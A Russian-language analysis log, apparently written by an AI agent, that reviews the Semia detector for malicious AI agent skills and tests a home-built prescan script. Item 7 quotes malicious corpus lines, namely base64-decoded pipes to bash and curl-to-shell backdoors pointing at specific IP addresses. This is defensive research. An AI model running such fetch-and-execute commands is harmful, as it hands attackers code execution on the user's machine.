# Semia — рабочий журнал

Сессия анализа, ветка `analysis/semia`. Дата: 2026-11-03.

## Что смотрели

- Клон `berabuddies/Semia` в scratchpad, `HEAD` = `379bc25fe99833eb185efe56a38fe15f0235799c`
  (2026-06-05, «release: align v0.1.3 metadata»). Ничего не запускали: ни CLI,
  ни тесты, ни хуки pre-commit, ни `semia.pyz`.
- `LICENSE` — полный текст Apache-2.0; `NOTICE` — RiemaLabs; `TRADEMARKS.md` —
  имя «Semia» нельзя использовать в названии форков/производных.
- Прочитано: `README.md`, `prepare.py`, `schema.py`, оба `.dl` с правилами,
  `pipeline.py` (промпт синтеза), `llm_providers.py`, плагин Claude Code
  (`plugin.json`, `SKILL.md`), маркетплейс.
- `semia.pyz` (бандл в плагине) распакован через `zipfile` без запуска:
  33 файла, все побайтно совпадают с `packages/*/src` на этом SHA; бандлы
  claude-code и codex идентичны.

## Ход разбора

1. **Правила и словари** (`rules/sdl/*.dl`, `schema.py`): 11 меток, все
   поверх фактов от LLM. Метки прямой инъекции нет; промпт синтеза
   (`pipeline.py`, `_render_synthesis_prompt`) просит записать инъекцию в
   `skill_doc_claim`, но в `ALLOWED_DOC_CLAIMS` такого значения нет —
   правило не сработает. → `items/rules-taxonomy.md`.
2. **Опись** (`prepare.py`): `_SKIP_DIRS_ALWAYS` (build, dist, vendor, out,
   target, node_modules, coverage…) не попадают даже в опись;
   `_SKIP_FILES_ALWAYS` включает `package.json`; читаются только файлы из
   `_TEXT_EXTENSIONS` (нет `.cjs`, `.ps1`, `.bat`, без расширения), лимит 1 МБ.
3. **Подпроцессы и сеть** (`llm_providers.py`): `claude --print
   --permission-mode dontAsk --tools ""`, `codex exec --sandbox read-only`;
   `cwd` — каталог прогона (`synthesis_loop.py`: `root` = run dir), хуки цели
   не подхватятся. Сеть — только `urlopen` к провайдеру. Телеметрии нет.
4. **Заземление** (`evidence.py`): Жаккар по токенам, порог 0.2, для длинных
   строк ослабляется до 0.1. Ловит выдуманные цитаты, не пропуски.
5. **Серьёзность**: `Finding.severity` по умолчанию `warning`, детектор её не
   задаёт → ранжирования нет, вопреки README.
6. **Точность**: в репо разметки нет (корпус = smoke-тест). Статья (abstract
   через WebFetch): 13 728 скиллов; 541 размеченный: recall 97.7 %, F1 90.6 %;
   precision не указана, вычислена ≈ 84.5 %.
7. **Корпус** `tests/fixtures/skills` (50 чужих скиллов, лицензии не указаны):
   21 — вредоносы (ClawHub-кампания: zip с паролем, glot.io,
   `base64 -D | bash` → `curl http://91.92.242.30/…`; бэкдор
   `curl http://54.91.154.110:13338/|sh`). Читали только как данные.
8. **Прототип `skill_prescan.py`** (наш код, stdlib, запускался только на
   данных в scratchpad и на `plugins/boost`, `python3 -I`):
   - прогон 1: 20/21 вредоносов BLOCK, пропуск `pptx-creatord`; ложный BLOCK
     `deadclaw` (Telegram API), ложные HIGH на цитатах шаблонов и отрицаниях;
   - правки: Telegram/Discord/Slack → HIGH `exfil-channel`; «must be installed
     before using» → HIGH; профиль браузера → HIGH; цитаты и отрицания →
     REVIEW; номер строки для декодированного base64;
   - `boost`: 1 BLOCK + 4 HIGH, все ложные (наш README «Никаких `curl | bash`»,
     «не выполняй без подтверждения») → добавлен учёт рус./англ. отрицаний;
   - прогон 3: корпус 20 BLOCK / 7 HIGH / 25 прочее; `boost` 0 BLOCK, 1 HIGH
     в `evals/`. → `items/prescan-eval.md`.
9. Сравнение с `repo-security-review` (чек-лист), `security-harness`,
   `strix`, `proposals/odoo19-mvp-build/security-review` → README, таблица.

## Решения

- Сам инструмент не запускали (правило сессии). Отсюда: его точность на наших
  задачах не замерена — только по статье.
- Префильтр написан своим кодом, а не взят из Semia: у Semia детерминирована
  только часть после LLM, а нам нужен шаг без модели и без сети.
- Карточки в `items/`: 4 файла + скрипт (лимит 8 соблюдён).

## Открытые вопросы

- Запустить ли Semia в режиме плагина на 3–4 подложенных скиллах (инъекция в
  тексте, хук с сетью, вредонос в `dist/`, чистый) ради честного A/B с нашим
  чек-листом? Нужно явное разрешение пользователя на запуск `semia.pyz`.
- Куда класть `skill_prescan.py`: скилл `boost` (например, `skill-vetting`) или
  `scripts/` репозитория для сессий анализа и CI маркетплейса?
- Вливать ли `checklist-additions.md` вместе с чек-листом из
  `repo-security-review` одним изменением `criteria.md`.
